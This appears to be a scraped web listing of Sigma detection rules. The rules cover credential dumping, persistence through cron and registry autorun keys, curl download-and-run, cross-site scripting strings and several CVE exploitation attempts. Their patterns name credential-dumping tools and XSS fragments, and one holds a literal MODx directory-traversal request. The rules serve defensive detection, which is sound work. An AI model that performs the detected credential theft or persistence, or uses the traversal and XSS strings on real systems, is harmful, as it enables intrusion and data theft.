<li><a href="#">title:Creation of an Executable by an Executable id: 297afac9-5d02-4138-8c58-b977bac60556 status: experimental description: Detects the creation of an executable by another executable author: frack113 references: - Malware Sandbox date: 2022/03/09 modified: 2022/06/04 logsource: product: windows category: file_event detection: selection: Image|endswith: '.exe' TargetFilename|endswith: '.exe' filter_whitelist: Image: - 'C:\Windows\System32\msiexec.exe' - 'C:\Windows\system32\cleanmgr.exe' - 'C:\Windows\explorer.exe' - 'C:\WINDOWS\system32\dxgiadaptercache.exe' - 'C:\WINDOWS\system32\Dism.exe' filter_update: Image: 'C:\WINDOWS\system32\svchost.exe' TargetFilename|startswith: 'C:\Windows\SoftwareDistribution\Download\Install\' # Security_UserID: S-1-5-18 filter_tiworker: Image|startswith: 'C:\Windows\WinSxS\' Image|endswith: '\TiWorker.exe' filter_programfiles: - Image|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' - TargetFilename|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' filter_defender: Image|startswith: 'C:\ProgramData\Microsoft\Windows Defender\' filter_windows_apps: TargetFilename|contains: '\Microsoft\WindowsApps\' condition: selection and not 1 of filter_* falsepositives: - Software installers - Update utilities #Please contribute to FP to go up the level level: low tags: - attack.resource_development - attack.t1587.001 
<li><a href="#">title:Creation Of An User Account id: 759d0d51-bc99-4b5e-9add-8f5b2c8e7512 status: test description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system. author: Marie Euler references: - 'MITRE Attack technique T1136; Create Account ' date: 2020/05/18 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' exe|endswith: '/useradd' condition: selection falsepositives: - Admin activity level: medium tags: - attack.t1136.001 - attack.persistence 
<li><a href="#">title:Creation of an WerFault.exe in Unusual Folder id: 28a452f3-786c-4fd8-b8f2-bddbe9d616d1 status: experimental description: Detects WerFault copoed to a suspicious folder, which could be a sign of WerFault DLL hijacking author: frack113 references: - date: 2022/05/09 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - '\WerFault.exe' - '\wer.dll' filter_whitelist: TargetFilename|contains: - '\System32\' - '\SysWOW64\' - '\WinSxS\' condition: selection and not filter_whitelist falsepositives: - Unknown level: high tags: - attack.persistence - attack.defense_evasion - attack.t1574.001 
<li><a href="#">title:Cred Dump Tools Dropped Files id: 8fbf3271-1ef6-4e94-8210-03c2317947f6 status: test description: Files with well-known filenames (parts of credential dump software or files produced by them) creation author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/11/01 modified: 2022/01/11 logsource: category: file_event product: windows detection: selection: - TargetFilename|contains: - '\pwdump' - '\kirbi' - '\pwhashes' - '\wce_ccache' - '\wce_krbtkts' - '\fgdump-log' - TargetFilename|endswith: - '\test.pwd' - '\lsremora64.dll' - '\lsremora.dll' - '\fgexec.exe' - '\wceaux.dll' - '\SAM.out' - '\SECURITY.out' - '\SYSTEM.out' - '\NTDS.out' - '\DumpExt.dll' - '\DumpSvc.exe' - '\cachedump64.exe' - '\cachedump.exe' - '\pstgdump.exe' - '\servpw.exe' - '\servpw64.exe' - '\pwdump.exe' - '\procdump64.exe' condition: selection falsepositives: - Legitimate Administrator using tool for password recovery level: high tags: - attack.credential_access - attack.t1003.001 - attack.t1003.002 - attack.t1003.003 - attack.t1003.004 - attack.t1003.005 
<li><a href="#">title:Cred Dump-Tools Named Pipes id: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e status: test description: Detects well-known credential dumping tools execution via specific named pipes author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/11/01 modified: 2021/11/27 logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: PipeName|contains: - '\lsadump' - '\cachedump' - '\wceservicepipe' condition: selection falsepositives: - Legitimate Administrator using tool for password recovery level: critical tags: - attack.credential_access - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 
<li><a href="#">title:Credential Dumping by LaZagne id: 4b9a8556-99c4-470b-a40c-9c8d02c77ed0 description: Detects LSASS process access by LaZagne for credential dumping. status: stable date: 2020/09/09 author: Bhabesh Raj, Jonhnathan Ribeiro references: - tags: - attack.credential_access - attack.t1003.001 - attack.s0349 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' CallTrace|contains|all: - 'C:\\Windows\\SYSTEM32\\ntdll.dll+' - '|C:\\Windows\\System32\\KERNELBASE.dll+' - '_ctypes.pyd+' - 'python27.dll+' GrantedAccess: '0x1FFFFF' condition: selection level: critical falsepositives: - Unknown 
<li><a href="#">title:Credential Dumping by Pypykatz id: 7186e989-4ed7-4f4e-a656-4674b9e3e48b description: Detects LSASS process access by pypykatz for credential dumping. status: experimental date: 2021/08/03 author: Bhabesh Raj references: - tags: - attack.credential_access - attack.t1003.001 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' CallTrace|contains|all: - 'C:\Windows\SYSTEM32\ntdll.dll+' - 'C:\Windows\System32\KERNELBASE.dll+' - 'libffi-7.dll' - '_ctypes.pyd+' - 'python3*.dll+' # Pypy requires python>=3.6 GrantedAccess: '0x1FFFFF' condition: selection level: critical falsepositives: - Unknown 
<li><a href="#">title:Credential Dumping Tools Service Execution id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed description: Detects well-known credential dumping tools execution via service execution events status: experimental author: Florian Roth, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community date: 2017/03/05 modified: 2021/11/30 references: - tags: - attack.credential_access - attack.execution - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - attack.t1003.006 - attack.t1569.002 - attack.s0005 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains: - 'fgexec' - 'dumpsvc' - 'cachedump' - 'mimidrv' - 'gsecdump' - 'servpw' - 'pwdump' condition: selection falsepositives: - Legitimate Administrator using credential dumping tool for password recovery level: high 
<li><a href="#">title:Credential Dumping Tools Service Execution id: df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2 related: - id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed type: derived description: Detects well-known credential dumping tools execution via service execution events status: experimental author: Florian Roth, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community date: 2017/03/05 modified: 2021/11/10 references: - tags: - attack.credential_access - attack.execution - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - attack.t1003.006 - attack.t1569.002 - attack.s0005 logsource: product: windows category: driver_load detection: selection: ImageLoaded|contains: - 'fgexec' - 'dumpsvc' - 'cachedump' - 'mimidrv' - 'gsecdump' - 'servpw' - 'pwdump' condition: selection falsepositives: - Legitimate Administrator using credential dumping tool for password recovery level: critical 
<li><a href="#">title:Credential Dumping Tools Service Execution id: f0d1feba-4344-4ca9-8121-a6c97bd6df52 related: - id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed type: derived description: Detects well-known credential dumping tools execution via service execution events status: experimental author: Florian Roth, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community date: 2017/03/05 modified: 2021/09/21 references: - tags: - attack.credential_access - attack.execution - attack.t1003.001 - attack.t1003.002 - attack.t1003.004 - attack.t1003.005 - attack.t1003.006 - attack.t1569.002 - attack.s0005 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains: - 'fgexec' - 'dumpsvc' - 'cachedump' - 'mimidrv' - 'gsecdump' - 'servpw' - 'pwdump' condition: selection falsepositives: - Legitimate Administrator using credential dumping tool for password recovery level: high 
<li><a href="#">title:Credentials Dumping Tools Accessing LSASS Memory id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d status: experimental description: Detects process access LSASS memory which is typical for credentials dumping tools author: Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov, oscd.community (update) date: 2017/02/16 modified: 2022/06/24 references: - - - - tags: - attack.credential_access - attack.t1003.001 - attack.s0002 - car.2019-04-004 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' GrantedAccess|startswith: - '0x40' # - '0x1000' # minimum access requirements to query basic info from service # - '0x1400' - '0x100000' - '0x1410' # car.2019-04-004 # - '0x1010' # car.2019-04-004 - '0x1438' # car.2019-04-004 - '0x143a' # car.2019-04-004 - '0x1418' # car.2019-04-004 - '0x1f0fff' - '0x1f1fff' - '0x1f2fff' - '0x1f3fff' filter1: SourceImage: - 'C:\WINDOWS\system32\taskmgr.exe' - 'C:\Windows\System32\perfmon.exe' filter2: SourceImage|startswith: 'C:\ProgramData\Microsoft\Windows Defender\' SourceImage|endswith: '\MsMpEng.exe' filter2b: SourceImage: 'C:\Windows\System32\svchost.exe' CallTrace|contains|all: - '|C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{' - '}\mpengine.dll+' GrantedAccess: '0x1418' filter3: SourceImage|startswith: 'C:\Program Files\WindowsApps\' SourceImage|endswith: '\GamingServices.exe' GrantedAccess: - '0x1410' - '0x410' filter4: SourceImage|endswith: - '\PROCEXP64.EXE' - '\PROCEXP.EXE' - 'C:\WINDOWS\system32\taskhostw.exe' - '\MBAMInstallerService.exe' GrantedAccess: - '0x1410' - '0x410' - '0x40' filter5: SourceImage|startswith: 'C:\ProgramData\VMware\VMware Tools\' SourceImage|endswith: '\vmtoolsd.exe' filter6: SourceImage: 'C:\WINDOWS\system32\svchost.exe' GrantedAccess: '0x100000' filter7: SourceImage: - 'C:\WINDOWS\system32\wbem\wmiprvse.exe' - 'C:\Windows\syswow64\MsiExec.exe' - 'C:\Windows\System32\msiexec.exe' GrantedAccess: - '0x1410' - '0x410' filter8: SourceImage|endswith: - '\thor.exe' - '\thor64.exe' - '\aurora-agent.exe' - '\aurora-agent-64.exe' GrantedAccess: - '0x40' - '0x1010' filter9: SourceImage|endswith: '\explorer.exe' GrantedAccess: '0x401' filter10: SourceImage: - 'C:\Windows\system32\wininit.exe' - 'C:\Windows\System32\lsass.exe' GrantedAccess: '0x1000000' filter11: SourceImage: 'C:\Windows\system32\MRT.exe' # Windows Malicious Software Removal Tool GrantedAccess: - '0x1410' - '0x1418' filter_handle: GrantedAccess: '0x40' SourceImage|endswith: - '\handle.exe' - '\handle64.exe' filter_generic: SourceImage|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' GrantedAccess: - '0x1410' - '0x410' filter_edge: # version in path 96.0.1054.43 SourceImage|startswith: C:\Program Files (x86)\Microsoft\Edge\Application\ SourceImage|endswith: \Installer\setup.exe # Old - too broad filter # SourceImage|endswith: # easy to bypass. need to implement supportive rule to detect bypass attempts # - '\wmiprvse.exe' # - '\taskmgr.exe' # - '\procexp64.exe' # - '\procexp.exe' # - '\lsm.exe' # - '\MsMpEng.exe' # - '\csrss.exe' # - '\wininit.exe' # - '\vmtoolsd.exe' condition: selection and not 1 of filter* fields: - ComputerName - User - SourceImage falsepositives: - Legitimate software accessing LSASS process for legitimate reason; please add more filters level: high 
<li><a href="#">title:Credentials from Password Stores - Keychain id: b120b587-a4c2-4b94-875d-99c9807d6955 status: test description: Detects passwords dumps from Keychain author: Tim Ismilyaev, oscd.community, Florian Roth references: - - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection1: Image: '/usr/bin/security' CommandLine|contains: - 'find-certificate' - ' export ' selection2: CommandLine|contains: - ' dump-keychain ' - ' login-keychain ' condition: 1 of selection* falsepositives: - Legitimate administration activities level: medium tags: - attack.credential_access - attack.t1555.001 
<li><a href="#">title:'Credentials In Files' id: 53b1b378-9b06-4992-b972-dde6e423d2b4 status: test description: 'Detecting attempts to extract passwords with grep and laZagne' author: 'Igor Fits, Mikhail Larin, oscd.community' references: - date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image|endswith: '/grep' CommandLine|contains: 'password' selection2: CommandLine|contains: 'laZagne' condition: selection1 or selection2 falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1552.001 
<li><a href="#">title:'Credentials In Files' id: df3fcaea-2715-4214-99c5-0056ea59eb35 status: test description: 'Detecting attempts to extract passwords with grep' author: 'Igor Fits, oscd.community' references: - date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: 'EXECVE' passwordgrep: - 'grep' - 'password' condition: execve and all of passwordgrep falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1552.001 
<li><a href="#">title:Cron Files id: 6c4e2f43-d94d-4ead-b64d-97e53fa2bd05 status: experimental description: Detects creation of cron files or files in Cron directories. Potential persistence. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.persistence - attack.t1053.003 references: - logsource: product: linux category: file_create detection: selection1: TargetFilename|startswith: - '/etc/cron.d/' - '/etc/cron.daily/' - '/etc/cron.hourly/' - '/etc/cron.monthly/' - '/etc/cron.weekly/' - '/var/spool/cron/crontabs/' selection2: TargetFilename|contains: - '/etc/cron.allow' - '/etc/cron.deny' - '/etc/crontab' condition: selection1 or selection2 falsepositives: - Any legitimate cron file. level: medium 
<li><a href="#">title:Cross Site Scripting Strings id: 65354b83-a2ea-4ea6-8414-3ab38be0d409 status: experimental description: Detects XSS attempts injected via GET requests in access logs author: Saw Win Naung, Nasreddine Bencherchali date: 2021/08/15 modified: 2022/06/14 references: - - logsource: category: webserver detection: select_method: cs-method: 'GET' keywords: - '=(script)' - '=%3Cscript%3E' - '=%253Cscript%253E' - 'iframe ' - '%3Ciframe ' - 'svg ' - '%3Csvg ' - 'document.cookie' - 'document.domain' - ' onerror=' - ' onresize=' - ' onload="' - 'onmouseover=' - '${alert' - 'javascript:alert' - 'javascript%3Aalert' filter: sc-status: 404 condition: select_method and keywords and not filter fields: - client_ip - vhost - url - response falsepositives: - JavaScripts,CSS Files and PNG files - User searches in search boxes of the respective website - Internal vulnerability scanners can cause some serious FPs when used, if you experience a lot of FPs due to this think of adding more filters such as "User Agent" strings and more response codes level: high"
<li><a href="#">title:Crypto Miner User Agent id: fa935401-513b-467b-81f4-f9e77aa0dd78 status: test description: Detects suspicious user agent strings used by crypto miners in proxy logs author: Florian Roth references: - - date: 2019/10/21 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|startswith: # XMRig - 'XMRig ' # CCMiner - 'ccminer' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Cscript Visual Basic Script Execution id: 23250293-eed5-4c39-b57a-841c8933a57d status: experimental description: Adversaries may abuse Visual Basic (VB) for execution author: frack113 references: - date: 2022/01/02 logsource: category: process_creation product: windows detection: selection: Image|endswith: \cscript.exe CommandLine|contains: '.vbs' condition: selection falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.005 
<li><a href="#">title:Curl Start Combination id: 21dd6d38-2b18-4453-9404-a0fe4a0cc288 status: test description: Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later. author: Sreeman references: - date: 2020/01/13 modified: 2022/07/05 logsource: category: process_creation product: windows detection: selection_curl: - Image|endswith: '\curl.exe' - Product: 'The curl executable' selection_susp_flags: CommandLine|contains: - ' start ' - '&call ' - '& call ' condition: all of selection* fields: - ParentImage - CommandLine falsepositives: - Administrative scripts (installers) level: high tags: - attack.execution - attack.t1218 - attack.command_and_control - attack.t1105 
<li><a href="#">title:Curl Usage on Windows id: bbeaed61-1990-4773-bf57-b81dbad7db2d status: test description: Detects a curl process start on Windows, which indicates a file download from a remote location or a simple web request to a remote server author: Florian Roth references: - date: 2022/07/05 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\curl.exe' - Product: 'The curl executable' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins - Administrative activity level: low tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:CurrentControlSet Autorun Keys Modification id: f674e36a-4b91-431e-8aef-f8a96c2aca35 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: system_control_base: EventType: SetValue TargetObject|contains: '\SYSTEM\CurrentControlSet\Control' system_control: TargetObject|contains: - '\Terminal Server\WinStations\RDP-Tcp\InitialProgram' - '\Terminal Server\Wds\rdpwd\StartupPrograms' - '\SecurityProviders\SecurityProviders' - '\SafeBoot\AlternateShell' - '\Print\Providers' - '\Print\Monitors' - '\NetworkProvider\Order' - '\Lsa\Notification Packages' - '\Lsa\Authentication Packages' - '\BootVerificationProgram\ImagePath' filter_empty: Details: '(Empty)' filter_cutepdf: Image: 'C:\Windows\System32\spoolsv.exe' TargetObject|contains: '\Print\Monitors\CutePDF Writer Monitor' Details: - 'cpwmon64_v40.dll' - 'CutePDF Writer' condition: system_control_base and system_control and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:CurrentVersion Autorun Keys Modification id: 20f0ee37-5942-4e45-b7d5-c5b5db9df5cd related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/06/24 logsource: category: registry_set product: windows detection: current_version_base: EventType: SetValue TargetObject|contains: '\SOFTWARE\Microsoft\Windows\CurrentVersion' current_version: TargetObject|contains: - '\ShellServiceObjectDelayLoad' - '\Run\' - '\RunOnce\' - '\Policies\System\Shell' - '\Policies\Explorer\Run' - '\Group Policy\Scripts\Startup' - '\Group Policy\Scripts\Shutdown' - '\Group Policy\Scripts\Logon' - '\Group Policy\Scripts\Logoff' - '\Explorer\ShellServiceObjects' - '\Explorer\ShellIconOverlayIdentifiers' - '\Explorer\ShellExecuteHooks' - '\Explorer\SharedTaskScheduler' - '\Explorer\Browser Helper Objects' - '\Authentication\PLAP Providers' - '\Authentication\Credential Providers' - '\Authentication\Credential Provider Filters' filter_all: - Details: '(Empty)' - TargetObject|endswith: '\NgcFirst\ConsecutiveSwitchCount' - Image|endswith: - '\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe' # C:\Users\*\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe - '\AppData\Roaming\Spotify\Spotify.exe' - Image: - 'C:\WINDOWS\system32\devicecensus.exe' - 'C:\Program Files\Microsoft OneDrive\StandaloneUpdater\OneDriveSetup.exe' - 'C:\Program Files\Microsoft OneDrive\Update\OneDriveSetup.exe' - 'C:\Program Files (x86)\Microsoft OneDrive\Update\OneDriveSetup.exe' - 'C:\Program Files\KeePass Password Safe 2\ShInstUtil.exe' - 'C:\Program Files\Everything\Everything.exe' - 'C:\Program Files (x86)\Microsoft Office\root\integration\integrator.exe' filter_logonui: Image: 'C:\Windows\system32\LogonUI.exe' TargetObject|contains: - '\Authentication\Credential Providers\{D6886603-9D2F-4EB2-B667-1971041FA96B}\' # PIN - '\Authentication\Credential Providers\{BEC09223-B018-416D-A0AC-523971B639F5}\' # fingerprint - '\Authentication\Credential Providers\{8AF662BF-65A0-4D0A-A540-A338A999D36F}\' # facial recognizion - '\Authentication\Credential Providers\{27FBDB57-B613-4AF2-9D7E-4FA7A66C21AD}\' # Trusted Signal (Phone proximity, Network location) filter_edge: Image|startswith: - 'C:\Program Files (x86)\Microsoft\EdgeUpdate\Install\' - 'C:\Program Files (x86)\Microsoft\EdgeWebView\' - 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' filter_dropbox: Image: 'C:\Windows\system32\regsvr32.exe' TargetObject|contains: 'DropboxExt' Details|endswith: 'A251-47B7-93E1-CDD82E34AF8B}' filter_opera: TargetObject|endswith: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Opera Browser Assistant' Details: 'C:\Program Files\Opera\assistant\browser_assistant.exe' filter_itunes: TargetObject|endswith: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\iTunesHelper' Details: '"C:\Program Files\iTunes\iTunesHelper.exe"' filter_zoom: TargetObject|endswith: '\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\zoommsirepair' Details: '"C:\Program Files\Zoom\bin\installer.exe" /repair' filter_greenshot: TargetObject|endswith: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Greenshot' Details: 'C:\Program Files\Greenshot\Greenshot.exe' filter_googledrive1: TargetObject|endswith: '\Software\Microsoft\Windows\CurrentVersion\Run\GoogleDriveFS' Details|startswith: 'C:\Program Files\Google\Drive File Stream\' Details|endswith: '\GoogleDriveFS.exe --startup_mode' filter_googledrive2: TargetObject|contains: 'GoogleDrive' Details: - '{CFE8B367-77A7-41D7-9C90-75D16D7DC6B6}' - '{A8E52322-8734-481D-A7E2-27B309EF8D56}' - '{C973DA94-CBDF-4E77-81D1-E5B794FBD146}' - '{51EF1569-67EE-4AD6-9646-E726C3FFC8A2}' filter_onedrive: Details|startswith: 'C:\Windows\system32\cmd.exe /q /c rmdir /s /q "C:\Users\' Details|contains: '\AppData\Local\Microsoft\OneDrive\' filter_python: TargetObject|endswith: '\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\{c60fd5ac-367d-4e3a-a975-f157502ac30a}' Details|contains: '\AppData\Local\Package Cache\{c60fd5ac-367d-4e3a-a975-f157502ac30a}\python' Details|endswith: '.exe" /burn.runonce' filter_officeclicktorun: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' filter_defender: Image: 'C:\Program Files\Windows Defender\MsMpEng.exe' condition: current_version_base and current_version and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:CurrentVersion NT Autorun Keys Modification id: cbf93e5d-ca6c-4722-8bea-e9119007c248 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/04/27 logsource: category: registry_set product: windows detection: nt_current_version_base: EventType: SetValue TargetObject|contains: '\SOFTWARE\Microsoft\Windows NT\CurrentVersion' nt_current_version: TargetObject|contains: - '\Winlogon\VmApplet' - '\Winlogon\Userinit' - '\Winlogon\Taskman' - '\Winlogon\Shell' - '\Winlogon\GpExtensions' - '\Winlogon\AppSetup' - '\Winlogon\AlternateShells\AvailableShells' - '\Windows\IconServiceLib' - '\Windows\Appinit_Dlls' - '\Image File Execution Options' - '\Font Drivers' - '\Drivers32' - '\Windows\Run' - '\Windows\Load' filter_empty: Details: '(Empty)' filter_edge: Image|startswith: 'C:\Program Files (x86)\Microsoft\Temp\' Image|endswith: '\MicrosoftEdgeUpdate.exe' filter_msoffice: - TargetObject|contains: - '\ClickToRunStore\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\' - '\ClickToRun\REGISTRY\MACHINE\Software\Microsoft\Windows NT\CurrentVersion\' - Image: - 'C:\Program Files\Microsoft Office\root\integration\integrator.exe' - 'C:\Program Files (x86)\Microsoft Office\root\integration\integrator.exe' - TargetObject|endswith: - '\Image File Execution Options\OSPPREARM.EXE\DisableExceptionChainValidation' - '\Image File Execution Options\LICLUA.EXE\DisableExceptionChainValidation' filter_dropbox: Image|endswith: '\DropboxUpdate.exe' TargetObject|endswith: '\Image File Execution Options\DropboxUpdate.exe\DisableExceptionChainValidation' filter_officeclicktorun: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' filter_security_extension_dc: Image: 'C:\Windows\system32\svchost.exe' TargetObject|contains: - '\Winlogon\GPExtensions\{827D319E-6EAC-11D2-A4EA-00C04F79F83A}\PreviousPolicyAreas' - '\Winlogon\GPExtensions\{827D319E-6EAC-11D2-A4EA-00C04F79F83A}\MaxNoGPOListChangesInterval' Details: - 'DWORD (0x00000009)' - 'DWORD (0x000003c0)' filter_ngen: Image|startswith: 'C:\Windows\Microsoft.NET\Framework' Image|endswith: '\ngen.exe' condition: nt_current_version_base and nt_current_version and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Custom Class Execution via Xwizard id: 53d4bb30-3f36-4e8a-b078-69d36c4a79ff status: test description: Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties. author: 'Ensar Åžamil, @sblmsrsn, @oscd_initiative' references: - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\xwizard.exe' CommandLine|re: '[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Custom File Open Handler Executes PowerShell id: 7530b96f-ad8e-431d-a04d-ac85cc461fdc description: Detects the abuse of custom file open handler, executing powershell author: CD_R0M_ date: 2022/06/11 status: experimental references: - logsource: category: registry_set product: windows detection: selection: TargetObject|contains: 'shell\open\command\' Details|contains|all: - 'powershell' - '-command' EventType: SetValue condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:CVE-2010-5278 Exploitation Attempt id: a4a899e8-fd7a-49dd-b5a8-7044def72d61 author: Subhash Popuri (@pbssubhash) date: 2021/08/25 status: experimental description: MODx manager - Local File Inclusion:Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter. references: - logsource: category: webserver detection: selection: c-uri|contains: /manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00 condition: selection falsepositives: - Scanning from Nuclei - Unknown tags: - attack.initial_access - attack.t1190 level: critical 
<li><a href="#">title:CVE-2020-0688 Exchange Exploitation via Web Log id: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5 status: test description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 author: Florian Roth references: - date: 2020/02/29 modified: 2021/11/27 logsource: category: webserver detection: selection1: cs-method: 'GET' c-uri|contains: - '/ecp/' - '/owa/' selection2: c-uri|contains: '__VIEWSTATE=' condition: selection1 and selection2 fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:CVE-2020-0688 Exploitation Attempt id: 7c64e577-d72e-4c3d-9d75-8de6d1f9146a status: test description: Detects CVE-2020-0688 Exploitation attempts author: NVISO references: - date: 2020/02/27 modified: 2021/11/27 logsource: category: webserver detection: selection: c-uri|contains|all: - '/ecp/default.aspx' - '__VIEWSTATEGENERATOR=' - '__VIEWSTATE=' condition: selection falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:CVE-2020-0688 Exploitation via Eventlog id: d6266bf5-935e-4661-b477-78772735a7cb status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - - author: Florian Roth, wagga date: 2020/02/29 modified: 2021/10/13 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: application detection: selection1: EventID: 4 Provider_Name: 'MSExchange Control Panel' Level: Error selection2: - '&__VIEWSTATE=' condition: selection1 and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:CVE-2020-10148 SolarWinds Orion API Auth Bypass id: 5a35116f-43bc-4901-b62d-ef131f42a9af status: test description: Detects CVE-2020-10148 SolarWinds Orion API authentication bypass attempts author: Bhabesh Raj references: - date: 2020/12/27 modified: 2022/01/07 logsource: category: webserver detection: selection: c-uri|contains: - 'WebResource.axd' - 'ScriptResource.axd' - 'i18n.ashx' - 'Skipi18n' valid_request_1: c-uri|contains: 'Orion/Skipi18n/Profiler/' valid_request_2: c-uri|contains: - 'css.i18n.ashx' - 'js.i18n.ashx' condition: selection and not valid_request_1 and not valid_request_2 falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
